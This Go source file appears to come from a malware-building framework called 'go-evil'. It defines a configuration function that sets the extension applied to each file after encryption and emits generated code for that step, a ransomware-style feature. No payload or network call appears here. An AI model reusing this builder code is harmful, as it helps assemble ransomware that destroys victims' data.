package configuration

import (
	"fmt"

	gotools "github.com/DennisTheodoreNedry/Go-tools"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
)

// This functions sets the extension that each file will have after being encrypted
func Set_extension(value string, data_object *json.Json_t) []string {

	function_call := "set_extension"
	value = gotools.EraseDelimiter(value, []string{"\"", " "}, -1)

	result := gotools.StartsWith(value, []string{"."})
	if ok := result["."]; !ok { // It does not contain a dot
		value = fmt.Sprintf(".%s", value) // So add it
	}

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int"},
		Gut: []string{
			"target := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"spine.crypt.extension = target",
		}})

	// Construct our int array
	parameter := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}
}
